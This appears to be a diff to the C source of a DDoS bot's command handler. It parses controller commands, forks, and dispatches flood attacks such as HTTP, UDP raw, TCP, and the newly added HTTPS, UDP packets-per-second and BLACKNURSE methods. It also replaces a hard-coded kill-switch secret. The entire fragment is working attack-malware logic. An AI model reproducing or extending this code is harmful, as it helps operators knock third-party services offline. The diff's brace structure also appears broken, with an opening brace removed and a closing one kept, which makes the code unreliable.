@@ -4,23 +4,34 @@ in_addr_t addr;
 
 void ft_manage_request(char *ptr)
 {
-	char **split;
+    char **split;
 
-	split = ft_split(ptr, '|');
-	if (ft_split_len(split) == 2 && !ft_strncmp(split[0], "KILL", 4) && !ft_strncmp(split[1], "ADFVDJIUCJHEhguehdFUCDJuyhy", 27)) // if args of KILL commands is "ADFVDJIUCJHEhguehdFUCDJuyhy" the bot kill itself
-		exit(0);
+    split = ft_split(ptr, '|');
+    if (split == NULL) {
+        // handle error, e.g., log it and return
+        fprintf(stderr, "ft_split failed\n");
+        return;
+    }
+
+    int split_len = ft_split_len(split);
+    if (split_len == 2 && !ft_strncmp(split[0], "KILL", 4) && !ft_strncmp(split[1], "iCKrBrfhaQZiqBXRcXFHWJAKcqA", 27)) {
+        ft_free_split(split);
+        exit(0);
+    }
 	if (!fork())
-	{
-		if (ft_split_len(split) >= 4)
-		{
-			if (!ft_strncmp(split[0], "OVHL7", 5) && ft_split_len(split) == 5)
+        if (split_len >= 4) {
+            if (!ft_strncmp(split[0], "OVHL7", 5) && ft_split_len(split) == 5)
 				OVHL7(split[1], atoi(split[2]), atoi(split[3]), atoi(split[4]));
 			else if (!ft_strncmp(split[0], "PPS", 3) && ft_split_len(split) == 5)
 				PPS(split[1], atoi(split[2]), atoi(split[3]), atoi(split[4]));
 			else if (!ft_strncmp(split[0], "HTTP", 4) && ft_split_len(split) == 7) // Already forked
 				HTTP(split[5], split[1], atoi(split[2]), split[4], atoi(split[3]), atoi(split[6]));
+			else if (!ft_strncmp(split[0], "HTTPS", 5) && ft_split_len(split) == 7) // Already forked
+				HTTPS(split[5], split[1], atoi(split[2]), split[4], atoi(split[3]), atoi(split[6]));
 			else if (!ft_strncmp(split[0], "UDPRAW", 6))
 				UDPRAW(split[1], atoi(split[2]), atoi(split[3]));
+			else if (!ft_strncmp(split[0], "UDPPPS", 6) && ft_split_len(split) == 5)
+				UDP_PPS(split[1], atoi(split[2]), atoi(split[3]), atoi(split[4])); //, atoi(split[5])
 			else if (!ft_strncmp(split[0], "HOLD", 4))
 				HOLD(split[1], atoi(split[2]), atoi(split[3]));
 			else if (!ft_strncmp(split[0], "JUNK", 4))
@@ -35,10 +46,13 @@ void ft_manage_request(char *ptr)
 				TCP(split[1], atoi(split[2]), atoi(split[3]), split[4], atoi(split[5]), atoi(split[6]), atoi(split[7]));
 			else if (!ft_strncmp(split[0], "XTDCUSTOM", 9))
 				XTDCUSTOM(split[1], atoi(split[2]), atoi(split[3]));
-		}
-		ft_free_split(split);
-		exit(0);
-	}
+        } else if (split_len == 3) {
+            if (!ft_strncmp(split[0], "BLACKNURSE", 10))
+				BLACKNURSE(split[1], atoi(split[2]));
+        }
+        ft_free_split(split);
+        exit(0);
+    }
 }
 
 int main(int argc, char *argv[])
